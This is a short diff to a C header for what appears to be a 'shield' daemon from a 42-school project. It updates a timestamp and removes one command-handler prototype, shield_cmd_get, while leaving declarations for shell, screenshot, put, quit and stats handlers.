@@ -6,7 +6,7 @@
 /*   By: kiroussa <oss@xtrm.me>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/28 22:00:44 by kiroussa          #+#    #+#             */
-/*   Updated: 2026/01/05 14:59:21 by kiroussa         ###   ########.fr       */
+/*   Updated: 2026/01/06 16:13:03 by kiroussa         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -34,7 +34,6 @@ int	shield_cmd_help(client_t *client, daemon_server_t *server, kr_strview_t *cmd
 int	shield_cmd_shell(client_t *client, daemon_server_t *server, kr_strview_t *cmdline);
 int shield_cmd_access_shell(client_t *client, daemon_server_t *server, kr_strview_t *cmdline);
 int	shield_cmd_screenshot(client_t *client, daemon_server_t *server, kr_strview_t *cmdline);
-int	shield_cmd_get(client_t *client, daemon_server_t *server, kr_strview_t *cmdline);
 int	shield_cmd_put(client_t *client, daemon_server_t *server, kr_strview_t *cmdline);
 int	shield_cmd_quit(client_t *client, daemon_server_t *server, kr_strview_t *cmdline);
 int	shield_cmd_stats(client_t *client, daemon_server_t *server, kr_strview_t *cmdline);
